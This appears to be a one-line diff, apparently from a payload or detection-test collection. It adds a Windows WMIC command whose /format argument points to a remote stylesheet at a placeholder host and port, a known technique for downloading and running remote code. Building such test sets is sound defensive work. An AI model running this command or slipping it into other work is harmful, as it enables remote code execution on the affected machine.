@@ -1,0 +1,1 @@
+wmic process get brief /format:"http://LOCAL_IP:LOCAL_PORT/HTTP_27_wmic.cmd"
